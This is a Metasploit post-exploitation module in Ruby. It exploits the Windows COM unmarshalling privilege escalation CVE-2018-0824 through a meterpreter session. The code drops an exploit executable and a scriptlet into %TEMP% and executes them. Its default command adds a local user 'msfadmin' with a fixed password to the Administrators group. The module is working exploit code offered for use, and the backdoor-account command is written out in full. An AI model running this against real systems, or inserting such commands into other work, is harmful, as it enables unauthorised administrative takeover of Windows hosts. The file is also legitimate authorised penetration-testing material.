# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Windows unmarshal post exploitation',
      'Description' => %q{
        This module exploits a local privilege escalation bug which exists
        in microsoft COM for windows when it fails to properly handle serialized objects.},
      'References'  =>
        [
          ['CVE', '2018-0824'],
          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824'],
          ['URL', 'https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn'],
          ['EDB', '44906']
        ],
      'Author'      =>
        [
          'Nicolas Joly', # Vulnerability discovery
          'Matthias Kaiser', # Exploit PoC
          'Sanjay Gondaliya', # Modified PoC
          'Pratik Shah <pratik@notsosecure.com>' # Metasploit module
        ],
      'DisclosureDate' => 'Aug 05 2018',
      'Arch'           => [ARCH_X64],
      'SessionTypes'   => ['meterpreter'],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
         OptString.new('POCCMD', [true, 'The command to run from poc.sct', '/k net user msfadmin P@ssw0rd /add && net localgroup administrators msfadmin /add']),
         OptString.new('READFILE', [ false, 'Read a remote file: ', 'C:\\Windows\\boot.ini' ])
      ])
  end

    def write_poc_to_target(rpoc, rpocname)
      begin
        print_warning("writing to %TEMP%")
        temppoc = session.fs.file.expand_path("%TEMP%") + "\\" + rpocname
        write_sct_to_target(temppoc,rpoc)
      end

    print_good("Persistent Script written to #{temppoc}")
    temppoc
   end

    def write_sct_to_target(temppoc,rpoc)
     fd = session.fs.file.new(temppoc, "w")
     fd.write(rpoc)
     fd.close
  end

    def app_poc_on_target(append,rpocname)
     appendpoc = session.fs.file.expand_path("%TEMP%") + "\\" + rpocname
     fd = session.fs.file.new(appendpoc, "a")
     fd.write(append)
     fd.close
   end

    def create_sct_file(txt)
     print_status("Reading Payload from file #{txt}")
     ::IO.read(txt)
   end

    def write_exe_to_target(rexe, rexename)
     begin
       print_warning("writing to %TEMP%")
       temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
       write_file_to_target(temprexe,rexe)
     end
    print_good("Persistent Script written to #{temprexe}")
    temprexe
   end

     def write_file_to_target(temprexe,rexe)
      fd = session.fs.file.new(temprexe, "wb")
      fd.write(rexe)
      fd.close
   end

     def create_payload_from_file(exec)
      print_status("Reading Payload from file #{exec}")
      ::IO.read(exec)
   end

     def run
      rexename =  Rex::Text.rand_text_alphanumeric(10) + ".exe"
      print_status("exe name is: #{rexename}")
      rpocname =  Rex::Text.rand_text_alphanumeric(10) + ".sct"
      print_status("poc name is: #{rpocname}")
      poccmd =  datastore['POCCMD']
      cmdcheck = datastore['CMDCHECK']

      rexe = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'UnmarshalPwn.exe')
      raw = create_payload_from_file rexe
      script_on_target = write_exe_to_target(raw, rexename)
      rpoc = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'poc_header')
      rawsct = create_sct_file rpoc
      poc_on_target = write_poc_to_target(rawsct, rpocname)

      cmdpoc = session.fs.file.expand_path("%TEMP%") + "\\" + rpocname
      fd = session.fs.file.new(cmdpoc, "a")
      fd.write(poccmd)
      fd.close

      rpoc1 = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'poc_footer')
      append = create_payload_from_file rpoc1
      append_on_target = app_poc_on_target(append, rpocname)

      print_status('Starting module...')
      print_line('')

      command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
      print_status("Location of UnmarshalPwn.exe is: #{command}")
      command1 = session.fs.file.expand_path("%TEMP%") + "\\" + rpocname
      print_status("Location of poc.sct is: #{command1}")

      command += " "
      command += "#{command1}"

      print_status("Executing command : #{command}")
      command_output = cmd_exec(command)
      print_line(command_output)
      print_line('')

  end
end
